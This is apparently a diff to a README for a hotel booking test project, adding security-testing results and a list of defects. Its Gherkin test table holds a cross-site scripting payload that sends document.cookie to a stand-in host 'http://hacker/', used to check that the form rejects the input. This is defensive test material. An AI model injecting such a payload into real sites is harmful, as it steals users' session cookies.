@@ -126,7 +126,7 @@ Feature : Hotel Booking System
   ## Security Cases
   User should not be able to save the booking (Security testing)
 
-### Below are the findings are of security testing :
+### Below are the findings of security testing :
 ```bash
   Scenario Outline: User should not be able to save the booking (Security testing)
     Given I entered the in-valid details : <first_name>, <sure_name>, <price>, <deposit>, <checkin_date>, <checkout_date>
@@ -134,4 +134,18 @@ Feature : Hotel Booking System
     | <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>   | <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>   | 500   | true   |  2018-06-20   |   2018-06-20    |
     When I clciked Save button
     Then the booking should not be saved
+```
+
+### Report : Security est Failed
+
+ ![alt text](https://user-images.githubusercontent.com/36641942/74157644-88692000-4c10-11ea-9bad-a497cdd94bde.PNG)
+
+
+```bash
+ ### Defects found based on the testing done :
+ 1. Error message was not displayed when user tries to create a booking by providing invalid firstname, surname, price and deposit.
+ 5. Error message should be displayed when user tries to create a booking by providing invalid check-in and check-out dates.
+ 6. Error message was not displayed when user tries to create a booking with check-out date lesser than the check-in date
+ 7. Error message was not displayed when user tries to create a booking with special character in the firstname and surname fields.
+ 8. User not able to edit the created booking.
 ```
